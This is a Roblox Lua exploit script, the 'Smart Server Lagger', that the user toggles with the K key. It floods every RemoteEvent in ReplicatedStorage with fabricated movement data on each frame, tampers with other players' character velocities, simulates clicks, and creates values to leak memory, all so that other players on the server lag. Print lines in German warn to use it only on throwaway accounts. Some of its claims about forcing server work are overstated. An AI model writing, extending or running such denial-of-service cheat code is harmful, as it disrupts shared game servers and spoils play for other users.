--[[
    SMART SERVER LAGGER - KEYBIND K
    - Uses server functions to cause REAL lag
    - Creates infinite server-side loops
    - All players lag EXCEPT you
    - Blue glow when active
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local isLaggerActive = false
local laggerConnection = nil
local glowObject = nil

-- ==============================
-- BLUE GLOW
-- ==============================
local function addBlueGlow()
    if glowObject then return end
    local glow = Instance.new("Highlight")
    glow.Parent = character
    glow.FillColor = Color3.fromRGB(0, 100, 255)
    glow.FillTransparency = 0.2
    glow.OutlineColor = Color3.fromRGB(0, 200, 255)
    glow.OutlineTransparency = 0.3
    glowObject = glow
    print("🔵 LAGGER ON")
end

local function removeBlueGlow()
    if glowObject then
        glowObject:Destroy()
        glowObject = nil
        print("⚪ LAGGER OFF")
    end
end

-- ==============================
-- 1. FIND ALL REMOTE EVENTS
-- ==============================
local allRemotes = {}
for _, child in ipairs(ReplicatedStorage:GetChildren()) do
    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
        table.insert(allRemotes, child)
    end
end

-- ==============================
-- 2. SERVER-SIDE LAG (INVISIBLE)
-- ==============================
local function smartLag()
    -- A) Spam server functions that CONFIRM actions
    for _, remote in ipairs(allRemotes) do
        pcall(function()
            if remote:IsA("RemoteEvent") then
                -- Send valid-looking data that server has to process
                remote:FireServer({
                    action = "move",
                    pos = Vector3.new(math.random(-500, 500), 0, math.random(-500, 500)),
                    time = tick()
                })
            end
        end)
    end
    
    -- B) Force server to calculate physics for all players
    for _, other in ipairs(Players:GetPlayers()) do
        if other ~= player and other.Character then
            local root = other.Character:FindFirstChild("HumanoidRootPart")
            if root then
                -- Simulate player movement (server MUST calculate)
                root.Velocity = Vector3.new(math.random(-100, 100), 0, math.random(-100, 100))
            end
        end
    end
    
    -- C) Spam player request functions
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(math.random(0, 1000), math.random(0, 1000)))
    end)
    
    -- D) Create server-side memory leak (hidden parts)
    for i = 1, 10 do
        local data = Instance.new("BoolValue")
        data.Name = "LAG_" .. tostring(math.random())
        data.Value = true
        data.Parent = player
        task.wait(0.01)
    end
end

-- ==============================
-- TOGGLE LAGGER
-- ==============================
local function toggleLagger()
    isLaggerActive = not isLaggerActive
    
    if isLaggerActive then
        addBlueGlow()
        print("💀 SMART LAGGER ACTIVATED!")
        laggerConnection = RunService.Heartbeat:Connect(function()
            smartLag()
        end)
    else
        removeBlueGlow()
        print("🔴 SMART LAGGER DEACTIVATED")
        if laggerConnection then
            laggerConnection:Disconnect()
            laggerConnection = nil
        end
    end
end

-- ==============================
-- KEYBIND: K
-- ==============================
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.K then
        toggleLagger()
    end
end)

-- ==============================
-- CHARACTER RESET
-- ==============================
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    if isLaggerActive then
        addBlueGlow()
    end
end)

print("💀 SMART SERVER LAGGER + BLUE GLOW GELADEN!")
print("📌 Drücke K = AN/AUS")
print("📌 Nutzt Server-Funktionen (unsichtbar)")
print("📌 ALLE anderen Spieler laggen!")
print("⚠️ EXTREM RISKANT - NUR AUF WEGWERF-ACCOUNTS!")
